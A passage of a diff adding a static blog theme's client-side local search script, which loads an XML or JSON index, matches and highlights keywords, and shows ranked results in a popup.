+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
